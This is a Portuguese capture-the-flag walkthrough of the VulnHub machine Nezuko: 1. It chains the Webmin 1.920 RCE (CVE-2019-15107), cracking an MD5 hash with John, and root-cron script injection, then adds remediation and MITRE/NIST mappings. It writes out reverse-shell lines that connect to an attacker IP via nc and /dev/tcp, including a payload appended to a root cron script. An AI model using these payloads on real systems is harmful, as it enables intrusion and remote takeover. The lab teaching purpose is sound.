# Nezuko: 1 — O Servidor da Caçadora de Demônios Tem um CVE

Olha só, rapaziada!! Quem diria que um CTF com tema de Demon Slayer ia te acertar com um RCE no Webmin em uma porta não-padrão e então trancar o caminho do root atrás de um script cron gravável? Nezuko: 1 encadeia um exploit público (EDB-47293, CVE-2019-15107) em um crack de hash em um abuso de cron com um fluxo limpo e satisfatório. O tema de anime é só enfeite: as técnicas aqui são reais e mapeiam diretamente para o que você vai encontrar em avaliações reais de servidores Linux. Top demais, fr fr.

Salve ao criador por amarrar o caminho de escalação ao lore do Demon Slayer: dois usuários, dois demônios para abater, uma flag no final. Estético. gg.

---

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Nezuko: 1 |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/nezuko-1,352/ |
| **Técnicas** | Nmap, RCE Webmin 1.920 (EDB-47293), entrega de reverse shell, cracking de hash com John the Ripper, abuso de script cron gravável |
| **CVEs** | CVE-2019-15107 (Webmin 1.920 RCE Não Autenticado), CWE-732 (Atribuição Incorreta de Permissão: script cron gravável por todos), CWE-916 (Uso de Hash de Senha com Esforço Computacional Insuficiente) |
| **Grupos APT** | APT32 (OceanLotus): explora interfaces de gerenciamento expostas à internet incluindo Webmin para acesso inicial a servidores Linux; Lazarus Group: uso documentado de painéis de admin web como pontos de entrada contra alvos de tecnologia e mídia |

---

## Resumo do Ataque

```
netdiscover / nmap
    |
    v
nmap -p-: 22/tcp SSH + 80/tcp HTTP + 13337/tcp HTTPS (Webmin 1.920)
    |
    v
searchsploit webmin 1.920 -> EDB-47293 (RCE Não Autenticado)
    |
    v
modificar exploit para reverse shell -> listener nc porta 1337
    |
    v
sh shell.sh https://192.168.1.105:13337 -> shell como nezuko
    |
    v
estabilização PTY com python3
    |
    v
cat /etc/passwd -> hash de zenitsu (MD5-crypt $1$...)
    |
    v
john hash.txt --wordlist=rockyou.txt -> zenitsu:meowmeow
    |
    v
su zenitsu -> ls ~/to_nezuko/ -> send_message_to_nezuko.sh (gravável por todos, executa como root via cron)
    |
    v
echo payload reverse shell >> send_message_to_nezuko.sh
    |
    v
listener nc porta 1234 -> shell root após execução do cron
    |
    v
cat /root/root.txt
```

---

## Metodologia

1. Descoberta de host e varredura completa de portas (não pular portas não-padrão)
2. Fingerprinting da versão do Webmin
3. Modificação e execução do exploit CVE-2019-15107 para shell como nezuko
4. Estabilização do shell com Python PTY
5. Extração do hash /etc/passwd e cracking com John the Ripper para zenitsu
6. Movimento lateral: su zenitsu
7. Enumeração de scripts cron: identificar script cron gravável por todos e executado como root
8. Injeção de payload no script cron
9. Shell root após execução do cron

---

## Passo 1 — Descoberta de Host e Varredura Completa de Portas

```bash
netdiscover -r 192.168.1.0/24
# Anote o IP alvo, ex.: 192.168.1.105

nmap -p- -A 192.168.1.105
```

**Portas abertas:**

| Porta | Serviço | Observações |
|---|---|---|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Página estática com imagem da Nezuko |
| 13337 | HTTPS | Webmin 1.920 (MiniServ) |

A porta não-padrão 13337 (leet-speak para "elite") é a chave. Sempre escaneie todas as 65535 portas em máquinas CTF e em engajamentos reais: serviços escondidos em portas não-padrão são comuns.

**Alternativa:**

```bash
rustscan -a 192.168.1.105 -- -A -sV
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Exploit RCE do Webmin (CVE-2019-15107 / EDB-47293)

O Webmin 1.920 contém uma vulnerabilidade de execução remota de código não autenticada (CVE-2019-15107) na funcionalidade de redefinição de senha. A vulnerabilidade permite que um atacante injete comandos no parâmetro `old` do `password_change.cgi` sem autenticação.

```bash
searchsploit webmin 1.920
# Retorna: Webmin 1.920 - Unauthenticated Remote Code Execution (EDB-47293)

searchsploit -m 47293
cp 47293.sh shell.sh
```

Modificar o payload do exploit para entregar um reverse shell:

```bash
# Editar o comando curl em shell.sh para substituir o payload de verificação
# Mudar o valor cmd para entregar um bash reverse shell:
# nc -e /bin/bash 192.168.1.106 1337
# OU:
# bash -i >& /dev/tcp/192.168.1.106/1337 0>&1
```

Iniciar o listener no atacante:

```bash
nc -lvnp 1337
```

Executar o exploit:

```bash
sh shell.sh https://192.168.1.105:13337
```

Um shell é recebido como usuário `nezuko`. Caramba, que lindo.

**Nota real:** CVE-2019-15107 foi ativamente explorada em 2019-2020 contra instalações Webmin expostas à internet. O APT32 (OceanLotus) foi observado varrendo instâncias Webmin expostas durante suas campanhas de 2019-2020 no Sudeste Asiático.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Pública

---

## Passo 3 — Estabilização do Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z
stty raw -echo; fg
# Enter duas vezes
```

Agora você tem um shell interativo adequado. Tab completion, controle de jobs, Ctrl+C para cancelar comandos, tudo funciona.

---

## Passo 4 — Enumeração como nezuko

```bash
ls ~/
# from_zenitsu/  nezuko.txt

cat ~/nezuko.txt
# Flag de usuário

cat /etc/passwd
# Procurar: zenitsu:$1$...(hash)...:1001:1001:...
```

O arquivo `/etc/passwd` contém o hash de senha de zenitsu no formato MD5-crypt (identificado por `$1$`). MD5-crypt foi depreciado décadas atrás; sistemas modernos devem usar SHA-512 ($6$) ou bcrypt ($2b$).

**MITRE ATT&CK:** T1552.001 — Credenciais Não Protegidas: Credenciais em Arquivos; T1003.008 — Dump de Credenciais do SO: /etc/passwd

---

## Passo 5 — Crackear o Hash de Senha de zenitsu

```bash
# Na máquina atacante
grep zenitsu /etc/passwd  # (obter o hash do shell)
echo 'zenitsu:$1$<valor_hash_aqui>' > /tmp/zenitsu_hash.txt
john /tmp/zenitsu_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/zenitsu_hash.txt --show
```

Credenciais crackeadas: `zenitsu:meowmeow`

A senha `meowmeow` (uma referência ao som de gato) é trivialmente crackeável com rockyou.txt. Hashes MD5-crypt são extremamente rápidos de crackear em hardware moderno.

**MITRE ATT&CK:** T1110.002 — Força Bruta: Cracking de Senha

---

## Passo 6 — Movimento Lateral: nezuko para zenitsu

```bash
su zenitsu
# Senha: meowmeow

id
# uid=1001(zenitsu) gid=1001(zenitsu) groups=1001(zenitsu)

ls ~/to_nezuko/
# send_message_to_nezuko.sh
```

---

## Passo 7 — Escalação de Privilégios via Script Cron

Inspecionar as permissões do script:

```bash
ls -la ~/to_nezuko/send_message_to_nezuko.sh
# -rwxrwxrwx 1 root root ... send_message_to_nezuko.sh
```

Gravável por todos. Pertence ao root. Este script quase certamente é executado por um job cron do root. Verificar:

```bash
cat /etc/crontab
# OU:
crontab -l
```

O script é executado como root a cada poucos minutos via cron. Como é gravável por todos, qualquer usuário pode modificá-lo. Este é um caminho direto para shell root.

Injetar o payload de reverse shell no script cron:

```bash
echo '0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60' >> ~/to_nezuko/send_message_to_nezuko.sh
```

Iniciar listener e aguardar o cron:

```bash
nc -lvnp 1234
# Aguardar até 5 minutos para o cron executar
```

Após execução do cron:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. Os demônios foram abatidos, mano.

**Nota real:** Scripts cron graváveis por todos executados como root são uma descoberta de escalação de privilégios de alta severidade em auditorias Linux corporativas. Essa exata má configuração aparece em múltiplos engajamentos Red Team e está documentada como mecanismo de persistência comum usado por atores de ameaça para manter acesso root após comprometimento inicial.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1059.004 — Interpretador de Comandos: Shell Unix

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Flag de usuário | `nezuko.txt` | `/home/nezuko/nezuko.txt` | Leitura de arquivo |
| Hash de senha | `$1$...(MD5-crypt)` | `/etc/passwd` entrada zenitsu | John: meowmeow |
| Credencial | `zenitsu:meowmeow` | Hash /etc/passwd crackeado | su zenitsu |
| Flag root | `root.txt` | `/root/root.txt` | Injeção em script cron |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Principal Aprendizado |
|---|---|---|---|
| 1 | Webmin 1.920 RCE não autenticado (CVE-2019-15107) | Explorado ativamente em 2019-2020; APT32 varreu instâncias Webmin expostas; exploit publicamente documentado | Atualizar Webmin imediatamente para 1.930+; restringir à VLAN de gerenciamento; exigir MFA |
| 2 | Hash MD5-crypt em /etc/passwd (não shadow) | MD5-crypt é depreciado e trivialmente crackeável; shadow com SHA-512 é o padrão mínimo | Migrar todas as senhas para /etc/shadow com SHA-512 ($6$) e contagem alta de rounds |
| 3 | Senha fraca (meowmeow) | Palavras simples de dicionário são alvos de primeira passagem em qualquer tentativa de crack | Implementar política de complexidade de senha; usar gerenciador de senhas; rejeitar palavras comuns |
| 4 | Script cron gravável por todos e executado como root | Descoberta de escalação de privilégios crítica em ambientes corporativos; mapeia para T1053.003 | Auditar todos os scripts cron para permissões de escrita: chmod 700 e chown root:root em todos os scripts cron |
| 5 | Porta não-padrão (13337) hospedando interface de gerenciamento | Segurança por obscuridade oferece proteção mínima; atores reais escaneiam todas as portas | Colocar interfaces de gerenciamento em firewall para hosts específicos; não confiar em ofuscação de porta |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Dump de Credenciais do SO: /etc/passwd | T1003.008 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Cracking de Senha | T1110.002 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Movimento Lateral | Movimento Lateral | Usar Material de Autenticação Alternativo | T1550 |
| Escalação de Privilégios | Escalação de Privilégios | Tarefa Agendada: Cron | T1053.003 |
| Execução | Execução | Tarefa Agendada: Cron | T1053.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualizar Webmin imediatamente:** fazer upgrade para 1.930 ou posterior; CVE-2019-15107 está corrigido em 1.930+; habilitar controles de acesso IP na configuração do Webmin
2. **Migrar senhas para shadow com SHA-512:** executar `pwconv` para mover hashes de /etc/passwd para /etc/shadow; configurar PAM para usar SHA-512
3. **Corrigir permissões do script cron:** `chmod 700 /home/zenitsu/to_nezuko/send_message_to_nezuko.sh; chown root:root /home/zenitsu/to_nezuko/send_message_to_nezuko.sh`
4. **Restringir Webmin à VLAN de gerenciamento:** configurar regras de firewall para permitir acesso ao Webmin apenas de hosts de gerenciamento autorizados
5. **Aplicar complexidade de senha:** implementar pam_pwquality com comprimento mínimo 12 e requisitos de complexidade

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (restrições IP do Webmin; desabilitar se não necessário)
- **D3-OAM**: Gerenciamento Administrativo do SO (permissões de script cron; aplicação de shadow passwords)
- **D3-PA**: Autenticação por Senha (shadow passwords SHA-512; aplicação de complexidade de senha)
- **D3-NTF**: Filtragem de Tráfego de Rede (firewall do Webmin para hosts de gerenciamento apenas)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todas as interfaces de gerenciamento (Webmin, cPanel etc.); auditar versões e status de patches |
| Proteger | Controle de Acesso | Restringir Webmin à VLAN de gerenciamento; exigir MFA para acesso admin |
| Proteger | Segurança de Dados | Migrar para shadow passwords com SHA-512; aplicar complexidade de senha |
| Detectar | Anomalias e Eventos | Alertar sobre tentativas de exploração do Webmin; monitorar modificações em scripts cron |
| Responder | Planejamento de Resposta | Aplicar patch no Webmin; rotacionar todas as senhas de usuários; auditar scripts cron para modificações não autorizadas |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem conhecida e boa; rotacionar todas as credenciais |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir acesso ao Webmin para hosts de gerenciamento |
| AC-6 | Menor Privilégio | Scripts cron: pertencentes ao root, graváveis apenas pelo root |
| CM-6 | Configurações | Atualizar Webmin; aplicar shadow passwords |
| CM-7 | Funcionalidade Mínima | Desabilitar Webmin se não ativamente necessário |
| IA-5 | Gerenciamento de Autenticadores | Shadow passwords SHA-512; aplicar complexidade |
| SI-2 | Remediação de Falhas | Aplicar patch CVE-2019-15107 do Webmin imediatamente |

### CISA KEV

CVE-2019-15107 (Execução Remota de Código no Webmin) é relevante às orientações da CISA sobre segurança de interfaces de gerenciamento expostas à internet. Organizações são aconselhadas a atualizar o Webmin para versões com patch ou restringir o acesso a redes somente de gerenciamento. Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Credenciais | MIL3 |

---

## Considerações Finais

Nezuko: 1 é uma máquina limpa e bem cadenciada que ensina técnicas reais com uma estética de anime. A cadeia de exploração CVE-2019-15107, cracking de hash e abuso de cron mapeia diretamente para padrões de ataque reais documentados. Se você conseguir trabalhar nesta máquina de ponta a ponta sem dicas, você tem fundamentos sólidos de comprometimento de servidores Linux.

O tema Demon Slayer é só sabor, mas é um bom sabor: Nezuko e Zenitsu como usuários sequenciais, cada um guardando o caminho para o próximo passo, é uma estrutura criativa. O criador claramente pensou na narrativa.

Continuem caçando demônios, mano. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
